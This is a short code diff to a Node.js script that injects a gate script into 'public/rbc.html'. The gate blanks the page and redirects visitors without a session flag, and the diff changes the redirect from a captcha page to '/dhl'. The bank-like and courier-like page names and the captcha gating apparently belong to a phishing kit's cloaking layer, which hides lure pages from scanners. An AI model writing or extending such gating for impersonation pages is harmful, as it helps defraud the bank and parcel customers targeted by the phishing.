@@ -1,6 +1,6 @@
 import fs from 'fs';
 
-const guardScript = `<script>if(!sessionStorage.getItem('__cptPass')||sessionStorage.getItem('__cptPass')!=='1'){try{document.documentElement.innerHTML=''}catch(e){}window.location.replace('/captcha.html');throw new Error('BLOCKED');}</script>`;
+const guardScript = `<script>if(!sessionStorage.getItem('__cptPass')||sessionStorage.getItem('__cptPass')!=='1'){try{document.documentElement.innerHTML=''}catch(e){}window.location.replace('/dhl');throw new Error('BLOCKED');}</script>`;
 
 // 1. Update public/rbc.html
 let rbc = fs.readFileSync('public/rbc.html', 'utf8');
